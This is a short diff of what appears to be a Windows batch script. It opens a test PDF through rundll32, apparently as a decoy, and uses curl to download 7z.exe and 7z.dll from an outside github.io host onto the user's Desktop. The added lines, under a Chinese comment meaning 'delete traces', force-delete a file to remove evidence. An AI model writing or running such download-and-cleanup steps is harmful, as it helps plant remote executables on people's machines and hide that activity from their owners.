@@ -4,3 +4,6 @@ rundll32 url.dll,FileProtocolHandler file:///%USERPROFILE%\Desktop\test.pdf
 
 curl https://kingdog2.github.io/7z.exe -o "%USERPROFILE%\Desktop\7z.exe"
 curl https://kingdog2.github.io/7z.dll -o "%USERPROFILE%\Desktop\7z.dll"
+
+///刪除軌跡
+del -f %USERPROFILE%\Desktop\A.txt
